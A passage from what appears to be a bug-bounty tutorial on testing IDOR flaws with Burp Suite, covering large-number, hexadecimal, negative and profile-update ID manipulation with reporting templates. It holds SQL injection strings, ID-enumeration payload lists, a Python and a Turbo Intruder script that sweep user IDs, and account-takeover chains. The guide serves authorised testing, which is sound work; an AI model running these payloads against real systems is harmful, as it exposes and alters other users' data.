- Best for testing one parameter
- Use when you have one position

#### **Battering Ram** (Same payload in all positions)
- Test multiple parameters simultaneously

#### **Pitchfork** (Multiple payload sets)
- Test different large numbers with different encodings

#### **Cluster Bomb** (Combinations)
- Test all combinations of payload sets

---

## 🛠️ **PHASE 8: BURP EXTENSIONS FOR IDOR**

### **Recommended Extensions**
1. **Autorize** - Automatically tests authorization
2. **Authz** - Test with different cookies
3. **Backslash Powered Scanner** - Finds weird server behavior
4. **JSON Web Tokens** - Decode/modify JWT
5. **Param Miner** - Discovers hidden parameters

### **Installing Extensions**
1. Go to **Extender → BApp Store**
2. Search and install relevant extensions
3. Configure for your testing

---

## 📋 **PHASE 9: DOCUMENTATION TEMPLATE**

### **Create Finding Template in Burp**

```
VULNERABILITY: Large Number IDOR
--------------------------------
Endpoint: /api/user/{id}
Method: GET
Parameter: id
Original Value: 100
Vulnerable Value: 2147483648

EVIDENCE:
- Status Code: 200 OK
- Response Length: 2543 bytes (matches valid user data)
- Data Leaked: User profile of ID: 1 (admin)
- Screenshot: [Attach]

IMPACT:
- Unauthorized access to admin account
- PII exposure
- Account takeover possible

REPRODUCTION STEPS:
1. Login as user_test
2. Capture GET /api/user/100 request
3. Modify id parameter to 2147483648
4. Observe admin data in response
```

---

## 🎓 **BEST PRACTICES & TIPS**

### **Pro Tips:**
1. **Use Intruder's "Save attack"** feature for reproducibility
2. **Create payload lists** for common large numbers
3. **Test authenticated AND unauthenticated** requests
4. **Check different HTTP versions** (HTTP/1.1 vs HTTP/2)
5. **Monitor server errors** (500 errors can indicate overflow)

### **Common Mistakes to Avoid:**
- ❌ Testing too fast (get rate limited)
- ❌ Not verifying findings manually
- ❌ Ignoring response times
- ❌ Only testing GET requests
- ❌ Forgetting to check response bodies

### **When Large Numbers Work Best:**
- PHP applications (loose typing)
- Old database schemas
- Integer-based IDs (not UUIDs)
- Legacy applications
- Poorly validated APIs

---

## 🔬 **TESTING CHECKLIST**

```
[ ] Map all ID parameters in scope
[ ] Test basic large numbers (999999999)
[ ] Test 32-bit boundaries (2147483647, 2147483648)
[ ] Test 64-bit boundaries
[ ] Test with different encodings
[ ] Test with different HTTP methods
[ ] Test authenticated vs unauthenticated
[ ] Analyze response patterns
[ ] Verify findings manually
[ ] Document with screenshots
[ ] Check for data leakage
[ ] Test for chaining opportunities
```

---

## ⚠️ **SAFETY REMINDERS**

- **Rate limit** your requests (use delays)
- **Don't DOS** the application
- **Stop testing** if you cause errors
- **Document responsibly**
- **Report findings** through proper channels
- **Never exploit** for personal gain

---

## 🎯 **SUCCESS INDICATORS**

You've found Bug #5 when:
- Large number returns 200 OK with other user's data
- Response length matches valid records
- Large number bypasses access controls
- Integer overflow grants access to first record (ID: 0 or 1)
- Database wraps around to existing records

---

# 🔍 **IDOR Bug #6: Decimal to Hex Conversion - Full Burp Suite Methodology**

## 📌 **Bug Description**
**Technique #6:** Converting decimal IDs to hexadecimal format to bypass input validation or access controls

## 🎯 **Target Scenarios**
- `https://target.com/api/user/100` → `https://target.com/api/user/0x64`
- `https://target.com/profile?id=100` → `https://target.com/profile?id=0x64`
- POST requests with `{"user_id": 100}` → `{"user_id": "0x64"}`

---

## 🛠️ **PHASE 1: RECONNAISSANCE & MAPPING**

### **Step 1.1: Spider/Crawl the Application**
1. Configure Burp Suite:
   ```
   Proxy → Intercept → Intercept is off
   Target → Site map → Right-click → Add to scope
   Spider → Scope → Use suite scope
   ```

2. Run Active Spider:
   ```
   Target → Site map → Right-click target → Spider this host
   ```

3. Manual browsing through all authenticated functionality while recording

### **Step 1.2: Identify Potential IDOR Points**
Look for these patterns in Burp history:

**Common Endpoints:**
```
GET /api/users/123
GET /profile?id=456
POST /api/orders/789
GET /download?file=987
PUT /api/posts/654
DELETE /api/comments/321
GET /account/balance?acct=111222
```

**Filter in Burp:**
```
Target → Site map → Filter by:
- MIME type: HTML, JSON, XML
- Status code: 200, 302
- Extension: .php, .asp, .jsp, .aspx, .do, .action
```

### **Step 1.3: Parameter Discovery**
Use Burp Intruder to discover hidden parameters:

1. Send request to Intruder
2. Positions tab: Clear all, add marker at end of URL or in body
3. Payloads: Load parameter wordlist
   ```
   id, user_id, userId, uid, pid, account_id, profile_id, 
   order_id, file_id, doc_id, reference, ref, token, 
   guid, uuid, hash, code, key, object_id
   ```

---

## 🔍 **PHASE 2: BASELINE TESTING**

### **Step 2.1: Establish Normal Behavior**
For each identified endpoint:

1. Send request to Repeater (right-click → Send to Repeater)
2. Document normal response:
   ```
   Original Request: GET /api/user/100
   Normal Response: HTTP 200, User data for user 100
   
   Note: Response time, content length, headers, specific data
   ```

3. Create a "map" of expected behavior:
   ```
   User 100 (own account): 200 OK, content-length 1542
   User 101 (other): 403 Forbidden, content-length 0
   Invalid ID 999999: 404 Not Found, content-length 125
   ```

### **Step 2.2: Validate Authorization**
Test that current user can ONLY access their own data:

```
GET /api/user/100 (current user) → 200 OK
GET /api/user/101 (other user) → 403/401/302
GET /api/user/999999 (invalid) → 404/400
```

---

## 🔢 **PHASE 3: HEX CONVERSION TESTING**

### **Step 3.1: Convert Decimal to Hex**
Create a mapping of test cases:

| Decimal | Hex | URL Encoded Hex |
|---------|-----|-----------------|
| 100 | 0x64 | 0x64 (same) |
| 101 | 0x65 | 0x65 |
| 102 | 0x66 | 0x66 |
| 1000 | 0x3E8 | 0x3E8 |
| 9999 | 0x270F | 0x270F |
| 12345 | 0x3039 | 0x3039 |

**Python helper for generating hex values:**
```python
# Generate hex test cases
for i in [100, 101, 102, 1000, 9999, 12345, 99999]:
    print(f"{i} → 0x{hex(i)[2:].upper()} → {hex(i)}")
    print(f"{i} → 0x{hex(i)[2:].lower()}")
```

### **Step 3.2: Manual Testing in Repeater**

**Test Case A: Path Parameter**
```
Original: GET /api/user/100
Test: GET /api/user/0x64
Test: GET /api/user/0X64
Test: GET /api/user/0x64/
Test: GET /api/user/0x64?format=json
```

**Test Case B: Query Parameter**
```
Original: GET /profile?id=100
Test: GET /profile?id=0x64
Test: GET /profile?id=0X64
Test: GET /profile?id=%30%78%36%34 (URL encoded)
```

**Test Case C: POST Body**
```
Original: {"user_id": 100}
Test: {"user_id": "0x64"}
Test: {"user_id": "0X64"}
Test: {"user_id": 0x64} (without quotes)
Test: {"user_id": "\\x30\\x78\\x36\\x34"}
```

### **Step 3.3: Verify Success Criteria**
Successful IDOR indicators:
- **200 OK** with other user's data
- **302 Redirect** to other user's dashboard
- **JSON/XML** containing sensitive data
- **File download** of other user's document
- **Partial data** leakage in error messages

---

## 🚀 **PHASE 4: AUTOMATED SCANNING WITH BURP INTRUDER**

### **Step 4.1: Configure Intruder Attack**

1. Send request to Intruder (right-click → Send to Intruder)

2. **Positions Tab:**
   ```
   Attack type: Sniper (for single parameter)
   OR
   Attack type: Pitchfork (for multiple parameters)
   
   Clear § markers, then highlight ID value and click Add
   
   Example:
   GET /api/user/§100§ HTTP/1.1
   ```

3. **Payloads Tab:**
   
   Create payload list:
   ```
   0x64
   0X64
   0x65
   0X65
   0x66
   0X66
   0x3E8
   0x270F
   0x3039
   hex(100)
   hex(101)
   %30%78%36%34  (URL encoded 0x64)
   ```

   **Alternative: Generate payloads with Payload Processing:**
   ```
   Add → Add from list → Numbers (sequential)
   Add → Add processing rule → Add prefix "0x"
   Add → Add processing rule → Hash → Hex
   ```

### **Step 4.2: Payload Generation Rules**

**Rule 1: Sequential with hex conversion**
```
Payload type: Numbers
Number range: 1-100
Number format: Hexadecimal
Min integer digits: 1
Max integer digits: 4
```

**Rule 2: Custom iterator**
```
Payload type: Custom iterator
Position 1: 0x, 0X, (blank)
Position 2: 64,65,66,67,3E8,270F
Position 3: '' (blank)
```

### **Step 4.3: Analyze Results**

**In Intruder Results Tab:**

1. **Sort by Status Code:**
   - Look for 200 OK responses
   - Check 302 redirects to other profiles
   - Note any 500 errors (might indicate parsing issues)

2. **Sort by Length:**
   ```
   Length 1542 (original) - own data
   Length 1542 (hex) - possible IDOR!
   Length 125 (error) - invalid
   Length 0 (blocked) - 403/401
   ```

3. **Sort by Response Time:**
   - Slower responses might indicate valid data retrieval
   - Faster responses might be cached/error pages

### **Step 4.4: Grep - Match Rules**

Add Grep - Match rules:
```
"John Doe" (other user's name)
"email@victim.com"
"admin"
"password"
"ssn"
"credit card"
"secret"
"private"
```

---

## 🎯 **PHASE 5: ADVANCED TESTING SCENARIOS**

### **Step 5.1: Hex Variations with Different Formats**

**Test different hex representations:**

```
Decimal: 100
Hex: 0x64
Hex without prefix: 64
Hex uppercase: 0X64
Hex with leading zeros: 0x0064
Hex in URL: %30%78%36%34
Double-encoded hex: %2530%2578%2536%2534
Hex in JSON: "\u0030\u0078\u0036\u0034"
```

### **Step 5.2: Hexadecimal in Different Locations**

**Request 1: Header-based**
```
GET /api/user HTTP/1.1
Host: target.com
X-User-ID: 0x64
X-Original-User: 0x64
Referer: https://target.com/api/user/0x64
```

**Request 2: Cookie-based**
```
Cookie: session=abc123; user_id=0x64; profile=0x64
```

**Request 3: Multipart form**
```
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=xxx

--xxx
Content-Disposition: form-data; name="user_id"

0x64
--xxx--
```

### **Step 5.3: Combine with Other Techniques**

**IDOR #6 + Parameter Pollution:**
```
GET /api/user?id=100&id=0x64
GET /api/user?user_id=0x64&user_id=100
```

**IDOR #6 + Array:**
```
GET /api/user?ids[]=100&ids[]=0x64
POST /api/batch
{"ids": [100, "0x64", 101]}
```

**IDOR #6 + Negative numbers:**
```
GET /api/user/-0x64
GET /api/user/0x-64
```

---

## 📊 **PHASE 6: VALIDATION & EXPLOITATION**

### **Step 6.1: Manual Verification**
For each promising result:

1. Copy request to Repeater
2. Send multiple times to ensure consistency
3. Test with different hex values:
   ```
   0x64 (100) - own data
   0x65 (101) - other user
   0x66 (102) - other user
   0xFFFF (65535) - random high value
   ```

4. Verify you're seeing OTHER users' data:
   - Check for different names, emails
   - Verify with another account if possible
   - Compare with original response

### **Step 6.2: Check Data Sensitivity**

Create a sensitivity checklist:
```
□ Personally Identifiable Information (PII)
□ Email addresses
□ Phone numbers
□ Physical addresses
□ Financial data
□ Authentication tokens
□ Session cookies
□ Private messages
□ Uploaded files
□ Admin functionality
```

### **Step 6.3: Chain with Other Vulnerabilities**

**Chain #1: IDOR → Information Disclosure**
```
1. Find valid hex ID (0x65) in HTML comments
2. Access /api/user/0x65
3. Extract more valid IDs from response
4. Repeat for privilege escalation
```

**Chain #2: IDOR → Account Takeover**
```
1. Access other user's profile via hex ID
2. Find password reset functionality
3. Trigger reset for that user
4. Use IDOR to access reset token
```

---

## 📝 **PHASE 7: DOCUMENTATION & REPORTING**

### **Step 7.1: Capture Evidence**

**Screenshots to take:**
1. Normal request (own account)
2. Hex request showing other user's data
3. Burp Repeater with request/response
4. Burp Intruder results showing pattern

**Save Burp items:**
```
Right-click request → Save item
Includes: Request, response, timestamp, headers
```

### **Step 7.2: Create Proof of Concept**

**Simple Python PoC:**
```python
import requests

target = "https://target.com"
session = requests.Session()
session.cookies.update({"session": "your_session_cookie"})

# Test hex conversion
hex_ids = ["0x64", "0x65", "0x66", "0x3E8"]

for hex_id in hex_ids:
    response = session.get(f"{target}/api/user/{hex_id}")
    if response.status_code == 200:
        print(f"[+] Access to user {hex_id}")
        print(response.text[:200])  # First 200 chars
```

### **Step 7.3: Write Report Section**

**Template for IDOR #6 finding:**

```
Vulnerability: Insecure Direct Object Reference (IDOR) via Hexadecimal Conversion

Endpoint: GET /api/user/{id}

Description: The application accepts hexadecimal representations of user IDs 
(0x64 format) without proper authorization checks, allowing authenticated users 
to access other users' profiles by converting decimal IDs to hexadecimal.

Steps to Reproduce:
1. Login as user "attacker"
2. Navigate to /api/user/100 (your own profile)
3. Modify request to /api/user/0x64
4. Observe response contains data for user 100 (still your own)
5. Change to /api/user/0x65
6. Observe response contains data for user 101 (other user)

Impact: Unauthorized access to other users' personal information including:
- Full names
- Email addresses
- Account balances
- Private messages

Proof of Concept:
[Include screenshot or request/response]

Remediation:
- Implement proper access controls server-side
- Validate user permissions for every request
- Use indirect reference maps
- Reject unexpected ID formats
```

---

## 🛡️ **PHASE 8: BURP SUITE PRO FEATURES**

### **Step 8.1: Active Scan with Custom Insertion Points**

1. **Add custom insertion point:**
   ```
   Right-click request → Engagement tools → 
   Define custom insertion point → Add
   
   Type: Parameter value
   Location: /api/user/§100§
   ```

2. **Configure scan:**
   ```
   Active Scan → Insertion point → Custom
   Add payload: "0x" + original_value
   Add payload: "0X" + original_value
   ```

### **Step 8.2: Burp Extensions for IDOR**

**Recommended extensions:**
- **Authz** - Test authorization with different cookies
- **Autorize** - Automatic authorization testing
- **403 Bypasser** - Test access control bypasses
- **JSON Web Tokens** - Decode/modify JWT tokens
- **Param Miner** - Discover hidden parameters

### **Step 8.3: Session Handling Rules**

Configure macro for authenticated testing:
```
Project options → Sessions → Session handling rules
Add rule: Check session is valid
Add rule: Run macro to refresh session
Scope: Tools (Repeater, Intruder, Scanner)
```

---

## ⚡ **QUICK REFERENCE CHECKLIST**

```
[ ] Identify all endpoints with ID parameters
[ ] Document normal responses (own vs other)
[ ] Create hex payload list (0x64, 0x65, 0x66...)
[ ] Test in Repeater manually
[ ] Run Intruder with hex payloads
[ ] Filter results by status/length
[ ] Verify findings with other users
[ ] Check data sensitivity
[ ] Document with screenshots
[ ] Create PoC script
[ ] Write report
[ ] Test remediation
```

---

## 🎯 **SUCCESS INDICATORS**

**Green flags for IDOR #6:**
- ✅ 200 OK with other user's data
- ✅ 302 redirect to other user's dashboard
- ✅ Response contains other user's email/name
- ✅ File download with other user's content
- ✅ Ability to modify other user's data
- ✅ Access to admin functions via hex

**False positives to watch for:**
- ❌ Same data as own account (caching)
- ❌ Generic error page (not validated)
- ❌ Redirect to login (not authorized)
- ❌ Default/placeholder content

---

## 📚 **COMMON HEX CONVERSIONS REFERENCE**

| Decimal | Hex | Use Case |
|---------|-----|----------|
| 1 | 0x1 | First user |
| 10 | 0xA | Tenth user |
| 100 | 0x64 | Common test |
| 255 | 0xFF | Max byte |
| 1000 | 0x3E8 | Thousand |
| 9999 | 0x270F | Four-digit |
| 16384 | 0x4000 | 16k boundary |
| 32767 | 0x7FFF | Max signed short |
| 65535 | 0xFFFF | Max unsigned short |
| 100000 | 0x186A0 | Large number |
| 999999 | 0xF423F | Six digits |
| 2147483647 | 0x7FFFFFFF | Max signed int |
| 4294967295 | 0xFFFFFFFF | Max unsigned int |

---

# 🎯 **Bug #7: Negative IDs - Complete Burp Suite Methodology**

## **What is Bug #7?**
Testing for IDOR vulnerabilities by manipulating numeric IDs to **negative values** (e.g., changing `id=100` to `id=-100` or `id=-1`). Many applications fail to validate negative numbers properly, potentially exposing unauthorized data.

---

## 📊 **Understanding the Vulnerability**

### **Why Negative IDs Work:**
1. **SQL Database Behavior**: 
   - `SELECT * FROM users WHERE id = -100` returns no results (usually)
   - But `SELECT * FROM users WHERE id = -1 OR 1=1` might expose data
   
2. **Application Logic Flaws**:
   - Some apps use signed integers but don't validate negativity
   - Auto-increment IDs are always positive, but developers forget to check
   - Negative IDs can cause integer overflows or bypass validation

3. **Business Logic Cases**:
   - Refunds/transactions with negative amounts
   - Deleting records (negative IDs might trigger different logic)
   - Offset-based pagination (negative offsets)

---

## 🔍 **PHASE 1: Reconnaissance & Mapping**

### **Step 1.1: Identify All ID Parameters**

**Burp Setup:**
1. **Configure Burp Suite**:
   ```
   Proxy → Intercept → Turn interception ON
   Proxy → Options → Add: "Match and Replace" for logging
   ```

2. **Create Target Scope**:
   ```
   Target → Scope → Add host
   Check: "Use advanced scope control"
   Include: *.target.com
   Exclude: logout, static content
   ```

3. **Enable Session Handling**:
   ```
   Project Options → Sessions → Add
   Rule type: "Use cookies from cookie jar"
   ```

### **Step 1.2: Spider & Crawl**

**Active Spidering:**
```
Target → Site map → Right-click → Spider → Check "Spider recursively"
Options → Spider → Threads: 5, Retries: 1
```

**Passive Crawling (Burp Browser):**
```
Proxy → Intercept → Turn OFF
Proxy → Options → Intercept Client Requests: "Don't intercept"
Navigate manually through the application
```

### **Step 1.3: Parameter Discovery**

**Using Burp Scanner (Passive):**
```
Scanner → Live scanning → Crawl and Audit
Scope: "Use suite scope"
Check: "Passive scanning only"
```

**Manual Parameter Hunting:**
1. **Check URL Parameters**:
   ```
   /api/user?id=100
   /profile/100
   /download?file_id=100
   /invoice?number=INV-100
   ```

2. **Check POST Parameters**:
   ```
   Login forms
   Update profile forms
   Search functionality
   File uploads
   ```

3. **Check Headers & Cookies**:
   ```
   Cookie: user_id=100
   X-User-ID: 100
   Referer: /page?id=100
   ```

---

## 🎯 **PHASE 2: Targeted Testing**

### **Step 2.1: Initial Negative ID Tests**

**Manual Testing with Repeater:**

1. **Basic Negative Values**:
   ```
   Request: GET /api/user?id=100
   
   Send to Repeater (Ctrl+R)
   Modify: id=-100
   Send request
   
   Also test:
   id=-1
   id=-999999
   id=-2147483648 (Min 32-bit signed)
   id=-9223372036854775808 (Min 64-bit signed)
   ```

2. **Format Variations in Repeater**:
   ```
   Original: /api/user/100
   Test: /api/user/-100
   
   Original: POST /api/user with JSON {"id":100}
   Test: {"id":-100}
   ```

### **Step 2.2: Systematic Testing with Intruder**

**Setup Intruder Attack:**

1. **Select Attack Positions**:
   ```
   Request: GET /api/user?id=§100§
   
   Right-click → Send to Intruder (Ctrl+I)
   Positions tab → Clear § → Add § around the ID
   ```

2. **Payload Configuration**:

   **Payload Set 1:**
   ```
   Payload type: Numbers
   From: -100
   To: -1
   Step: 1
   Format: Decimal
   ```

   **Payload Set 2 (Boundary Testing):**
   ```
   Payload type: Custom iterator
   Position 1: ["-"]
   Position 2: ["1","10","100","1000","9999","32767","65535","2147483647"]
   ```

   **Payload Set 3 (Edge Cases):**
   ```
   Payload type: Simple list
   Payloads:
   -0
   -2147483648
   -9223372036854775808
   --100
   - 100
   -100%00
   -100%0a
   -100.5
   -1e2
   ```

3. **Attack Settings**:
   ```
   Resource pool → Create new pool
   Threads: 5
   Throttle between requests: 200ms
   ```

### **Step 2.3: Response Analysis**

**Configure Intruder Grep Extracts:**

1. **Status Code Analysis**:
   ```
   Options → Grep - Match
   Add: ["200 OK", "403", "404", "500"]
   Check: "Extract status codes"
   ```

2. **Content Length Monitoring**:
   ```
   Options → Grep - Extract
   Add: Response length
   Check: "Extract from response"
   ```

3. **Error Message Detection**:
   ```
   Options → Grep - Match
   Add error patterns:
   ["SQL", "mysql", "error", "exception", 
    "stack trace", "invalid", "unexpected",
    "illegal", "overflow", "negative"]
   ```

---

## 🧪 **PHASE 3: Advanced Testing Techniques**

### **Step 3.1: SQL Injection via Negative IDs**

**Using Repeater for SQL Tests:**

1. **Basic SQL Patterns**:
   ```
   id=-1 OR 1=1
   id=-1' OR '1'='1
   id=-1" OR "1"="1
   id=-1 UNION SELECT 1,2,3--
   id=-1 AND SLEEP(5)
   ```

2. **Time-based Detection**:
   ```
   Enable "Response analysis" in Repeater
   Check response times
   Use "Show response in browser" for rendering
   ```

### **Step 3.2: Boundary Testing with Intruder**

**Create Advanced Payloads:**

1. **Integer Overflow Patterns**:
   ```
   Payload type: Numbers
   From: 2147483647
   To: 2147483650
   Step: 1
   
   Also test:
   -2147483648 (wrap to -2147483648)
   4294967295 (max unsigned)
   -4294967295
   ```

2. **Mathematical Operations**:
   ```
   Payload type: Custom iterator
   Prefix: "-"
   Position 1: ["", "0", "00", "000"]
   Position 2: ["1", "2", "3", "100"]
   ```

### **Step 3.3: Parameter Pollution with Negatives**

**Test Multiple Parameters:**

1. **Duplicate Parameters**:
   ```
   GET /api/user?id=100&id=-100
   GET /api/user?id=-100&id=100
   POST with: id=100&id=-100
   ```

2. **Nested Parameters**:
   ```
   JSON: {"user":{"id":-100}}
   XML: <user><id>-100</id></user>
   Form: user[id]=-100
   ```

---

## 🔧 **PHASE 4: Automation & Scaling**

### **Step 4.1: Burp Extender Scripts**

**Install & Configure Extensions:**
```
Extender → BApp Store → Install:
- Autorize (continuous auth checks)
- AuthMatrix (role-based testing)
- JSON Web Tokens (for JWT manipulation)
- Turbo Intruder (high-speed attacks)
```

**Sample Turbo Intruder Script for Negative IDs:**
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=100,
                           pipeline=False)

    for i in range(-1000, 0):
        engine.queue(target.req, [str(i)])

def handleResponse(req, interesting):
    if '200' in req.response:
        table.add(req)
```

### **Step 4.2: Active Scanning Rules**

**Create Custom Scan Checks:**
```
Scanner → Live scanning → Audit
Check: "Use custom scan checks"
Options → Scanner → Insert custom scan check
```

**Custom Check Logic:**
1. Extract numeric parameters
2. Generate negative variants
3. Compare responses
4. Flag differences

---

## 📈 **PHASE 5: Results Analysis**

### **Step 5.1: Filter Intruder Results**

**Using Intruder Results Window:**

1. **Sort by Status**:
   ```
   Click "Status" column
   Look for 200 OK on negative IDs
   Check 500 errors (potential crashes)
   ```

2. **Analyze Length**:
   ```
   Sort by "Length" column
   Look for responses with same length as valid requests
   Investigate outliers
   ```

3. **Use Filters**:
   ```
   Filter by search term:
   - "error"
   - "exception"
   - username from valid response
   - data pattern from valid response
   ```

### **Step 5.2: Manual Verification**

**Use Comparer Tool:**
```
Select two responses (valid vs negative)
Right-click → Send to Comparer (Ctrl+C)
Analyze differences visually
Check for data leaks
```

**Repeater Verification:**
```
Copy interesting requests to Repeater
Test with different user sessions
Verify if data belongs to other users
Document proof of concept
```

---

## 🛡️ **PHASE 6: Exploitation**

### **Step 6.1: Data Extraction**

**If negative IDs work:**

1. **Enumerate Data**:
   ```
   Use Intruder with negative range
   Collect all responses with data
   Extract sensitive information
   ```

2. **Chain with Other Vulnerabilities**:
   ```
   Test negative ID + XSS
   Try negative ID + SQLi
   Combine with CSRF for state changes
   ```

### **Step 6.2: Privilege Escalation**

**Test Admin Functions:**
```
/admin/users?id=-1
/admin/delete?id=-100
/admin/export?user_id=-1
```

**Test Sensitive Operations:**
```
/account/transfer?amount=-1000&to=attacker
/cart/apply-discount?code=-50%
/refund/process?id=-100
```

---

## 📝 **PHASE 7: Reporting**

### **Documentation Template**

```markdown
# IDOR Vulnerability via Negative ID Manipulation

## Vulnerability Type
Insecure Direct Object Reference (IDOR) via Negative Parameters

## Endpoint
GET /api/user/profile?id=[PARAMETER]

## HTTP Request
GET /api/user/profile?id=-100 HTTP/1.1
Host: target.com
Cookie: [session]

## HTTP Response
[Paste response showing unauthorized data]

## Impact
- Unauthorized access to user data
- Potential data breach
- Privilege escalation possible

## Proof of Concept
1. Log in as user A (ID: 100)
2. Intercept request to /api/user/profile
3. Change id=100 to id=-100
4. Observe user B's data returned

## CVSS Score
CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N
Base Score: 6.5 (Medium)

## Remediation
- Validate ID is positive integer
- Implement proper access controls
- Use indirect reference maps
- Server-side authorization checks
```

---

## 🎯 **Success Indicators**

**Positive Results:**
- ✅ 200 OK with other users' data
- ✅ 200 OK with admin data
- ✅ Different content length than invalid IDs
- ✅ Error messages revealing system info
- ✅ SQL errors indicating injection

**Negative Results:**
- ❌ 403 Forbidden
- ❌ 404 Not Found
- ❌ 302 Redirect to login
- ❌ Empty response
- ❌ Generic error message

---

## ⚡ **Quick Reference Commands**

```bash
# Burp Shortcuts
Ctrl+R    - Send to Repeater
Ctrl+I    - Send to Intruder  
Ctrl+Shift+B - Send to Comparer
Ctrl+F    - Search in response

# Intruder Payload Presets for Negative IDs
-1 to -100 (sequential)
-2147483648 (min 32-bit)
-9223372036854775808 (min 64-bit)
-0, -00, -000
--1, --100
-1%00, -100%0a
```

---

## 🚨 **Important Notes**

- Always test in authorized environments
- Use Burp's "Scope" to avoid hitting out-of-scope targets
- Throttle requests to avoid DoS
- Document all findings immediately
- Take screenshots of successful exploits
- Test in incognito/private mode to avoid cache issues

---

# 🔍 **Bug #8: IDOR in Profile Update - Full Burp Suite Methodology**

## 📌 **Bug Description**
**IDOR in Profile Update** - Modifying other users' profile information by manipulating user identifiers during profile update operations.

---

## 🎯 **Vulnerability Overview**
When a user updates their profile, the application uses a user ID parameter to identify which profile to update. If proper authorization checks aren't performed, an attacker can modify this ID to update other users' profiles.

---

## 🛠️ **Complete Burp Suite Methodology**

### **PHASE 1: RECONNAISSANCE & MAPPING**

#### **Step 1: Map Profile Update Functionality**
```
1. Login with User A (attacker account)
2. Navigate to Profile Settings / Edit Profile
3. Turn on Burp Intercept
4. Update any profile field (name, email, bio, etc.)
5. Capture the request
```

**Typical endpoints to look for:**
```
POST /profile/update
POST /api/user/update
POST /edit-profile
PUT /user/{id}
PATCH /profile
POST /account/settings
POST /update-profile.php
```

#### **Step 2: Identify ID Parameters**
Look for parameters that might identify the user:

**Common Parameter Names:**
```
user_id
uid
userId
profile_id
account_id
id
user
account
profile
member_id
userid
userID
profileId
accountId
```

**Example captured request:**
```
POST /profile/update HTTP/1.1
Host: target.com
Cookie: session=abc123
Content-Type: application/x-www-form-urlencoded

user_id=100&name=attacker&email=attacker@evil.com&bio=test
```

---

### **PHASE 2: BURP SUITE CONFIGURATION**

#### **Step 3: Send to Burp Intruder**
1. Right-click on the request → **Send to Intruder**
2. Go to **Intruder** tab

#### **Step 4: Configure Attack Positions**
```
Clear all payload positions first (Ctrl+A, then Clear §)

Select the user identifier value and mark it:
POST /profile/update HTTP/1.1
Host: target.com
Cookie: session=abc123

user_id=§100§&name=attacker&email=attacker@evil.com&bio=test
```

#### **Step 5: Set Attack Type**
Choose **Sniper** attack (testing one parameter at a time)

---

### **PHASE 3: PAYLOAD CONFIGURATION**

#### **Step 6: Create Target User List**
Generate potential victim IDs:

**Method A - Numbers (Sequential):**
1. Go to **Payloads** tab
2. **Payload Options** → Add from list
3. Generate numbers:
   - Start: 1
   - End: 200
   - Step: 1

**Method B - Numbers (Known pattern):**
If you have User B's ID (e.g., 105):
```
Add specific numbers:
101 (just before victim)
102
103
104
105 (victim)
106
107
108
109
110
```

**Method C - Custom wordlist:**
Create a list in Burp:
```
1
2
3
... (known IDs from other responses)
```

#### **Step 7: Configure Payload Processing (Advanced)**
If IDs are encoded:

**For Base64:**
1. Payload Processing → Add
2. Encode → Base64-encode

**For URL Encoding:**
1. Payload Processing → Add
2. Encode → URL-encode all characters

**For JSON format:**
```
Raw payload: 100
After processing: {"user_id":"100"}
```

#### **Step 8: Set Request Engine**
- **Threads:** 5-10 (don't overwhelm server)
- **Throttle:** 0-100ms between requests
- **Retries:** 0-1

---

### **PHASE 4: ATTACK EXECUTION**

#### **Step 9: Start the Attack**
Click **Start Attack** button

#### **Step 10: Monitor Attack Progress**
Watch for:
- **Status codes**: 200 vs 403 vs 500
- **Response length**: Different lengths may indicate success
- **Response times**: Unusual delays

---

### **PHASE 5: RESPONSE ANALYSIS**

#### **Step 11: Identify Successful IDORs**

**Indicators of Success:**

**A. Status Code Analysis**
```
Status 200 OK → Possible success
Status 302 Found → Redirect after update
Status 403 Forbidden → Access denied (good)
Status 404 Not Found → Invalid user
Status 500 Server Error → Potential SQL injection
```

**B. Response Length Analysis**
```
1. Sort results by "Length" column
2. Look for responses with SAME length as your original
3. Look for responses with DIFFERENT lengths
4. Note: Your own user ID (100) should be baseline
```

**C. Response Content Analysis**
```json
Example of successful response:
{
  "status": "success",
  "message": "Profile updated",
  "user": {
    "id": 105,
    "name": "attacker",
    "email": "attacker@evil.com"
  }
}
```

**D. Error Messages**
```
"User not found" → ID exists but not accessible
"Unauthorized" → Good protection
"Permission denied" → Good protection
"Profile updated" → BINGO!
```

---

### **PHASE 6: MANUAL VERIFICATION**

#### **Step 12: Manual Testing with Burp Repeater**

**A. Basic Test:**
1. Send suspicious request to Repeater (Ctrl+R)
2. Modify ID to victim's ID
3. Send request
4. Analyze response

**B. Verify with User B Login:**
1. Login as User B (victim)
2. Check if profile was actually modified
3. Document proof

#### **Step 13: Test Different HTTP Methods**

**Original:**
```
POST /profile/update HTTP/1.1
user_id=105&name=attacker
```

**Try variations:**
```
PUT /profile/update HTTP/1.1
user_id=105&name=attacker

PATCH /profile/update HTTP/1.1
user_id=105&name=attacker

GET /profile/105 HTTP/1.1
```

#### **Step 14: Test Parameter Locations**

**Move ID to different locations:**

**Query Parameter:**
```
POST /profile/update?user_id=105 HTTP/1.1
name=attacker&email=attacker@evil.com
```

**JSON Body:**
```
POST /profile/update HTTP/1.1
Content-Type: application/json

{"user_id": 105, "name": "attacker"}
```

**Cookie:**
```
POST /profile/update HTTP/1.1
Cookie: session=abc123; user_id=105
name=attacker
```

**Header:**
```
POST /profile/update HTTP/1.1
X-User-ID: 105
name=attacker
```

---

### **PHASE 7: ADVANCED TECHNIQUES**

#### **Step 15: Parameter Pollution Test**
```
POST /profile/update HTTP/1.1

user_id=100&user_id=105&name=attacker
```

#### **Step 16: Array/List Format**
```
POST /profile/update HTTP/1.1
Content-Type: application/x-www-form-urlencoded

user_ids[]=105&name=attacker

OR

user_ids=100,105,106&name=attacker
```

#### **Step 17: UUID/GUID Testing**
If using UUIDs, look for patterns:
```
Original: /profile/update?uuid=550e8400-e29b-41d4-a716-446655440000
Test:     /profile/update?uuid=550e8400-e29b-41d4-a716-446655440001
```

#### **Step 18: Test for Blind IDOR**
Sometimes no visible response change, but data updates:

**Technique:**
1. Modify victim's profile with unique data
2. Login as victim
3. Check if data persisted

---

### **PHASE 8: EXPLOITATION & POC**

#### **Step 19: Create Proof of Concept**

**Documentation Template:**
```
VULNERABILITY: IDOR in Profile Update
=====================================
Target: https://target.com/profile/update

Original Request (Attacker User ID 100):
----------------------------------------
POST /profile/update HTTP/1.1
Host: target.com
Cookie: session=ATTACKER_SESSION
Content-Type: application/x-www-form-urlencoded

